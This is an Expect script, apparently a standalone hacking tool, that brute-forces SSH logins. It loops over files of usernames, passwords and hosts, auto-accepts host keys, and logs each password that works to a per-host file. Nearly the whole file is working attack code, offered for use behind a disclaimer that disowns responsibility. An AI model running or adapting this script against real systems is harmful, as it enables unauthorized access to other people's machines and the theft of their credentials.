#!/usr/bin/expect -f
#
#    Written by James Shanahan(jshanahan@comcastpc.com)
#    and Erin Palmer(epalmer@comcastpc.com)
#    ssh brute forcer
#    This will alow you to specify hosts, password lists, and a user
#    I do not take any reponsibilty for what you do with this tool
#    Hopefully it will make your life easier rather then making other
#    peoples lives more difficult!

set timeout 1
set dictionary [lindex $argv 0]
set file [lindex $argv 1]
set user [lindex $argv 2]


if {[llength $argv] != 3} {
   puts stderr "Usage: $argv0 <dictionary-file> <hosts-file> <user-file>\n"
   exit
}

set tryHost [open $file r]
set tryPass [open $dictionary r]
set tryUser [open $user r]

set passwords [read $tryPass]
set hosts [read $tryHost]
set login [read $tryUser]

foreach username $login {
    foreach passwd $passwords {
        foreach ip $hosts {
            spawn ssh $username@$ip -p 20000
            expect {
                "fuck" {
                    puts stderr "fucking!"
                }
                # some sshd response with "Password:" and others with "password:"
                -nocase "password:"  {
                    send "$passwd\n"
                    expect {
                        "Last login" {
                            set logFile [open $ip.log a]
                            puts $logFile "password for $username@$ip is $passwd\n"
                            close $logFile
                            send "exit\n"
                        }
                        -nocase "password:" {
                            set id [exp_pid]
                            exec kill -INT $id
                        }
                    }
                }
                "(yes/no)?" {
                    send "yes\n"
                    exp_continue
                }
            }
        }
    }
}

exit